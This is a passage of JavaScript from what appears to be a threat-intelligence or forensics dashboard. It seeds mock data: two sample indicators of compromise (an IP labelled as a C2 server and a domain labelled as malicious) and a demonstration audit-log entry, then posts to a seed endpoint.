      { id: 1, type: 'IP', value: '185.220.101.4', description: 'Active C2 Server IP', threatSource: 'System Detection Engine' },
      { id: 2, type: 'Domain', value: 'cyber-threat-ioc.com', description: 'Malicious Delivery Domain', threatSource: 'System Detection Engine' }
    ];
    mockAudits = [
      { id: 1, action: 'DATABASE_SEEDED', timestamp: new Date().toISOString(), investigatorId: 'SYSTEM', details: 'Default forensic demonstration logs pre-loaded.' }
    ];
    return apiCall('/settings/seed', { method: 'POST' }, { message: 'All forensic data pre-seeded locally.' });
  }
};
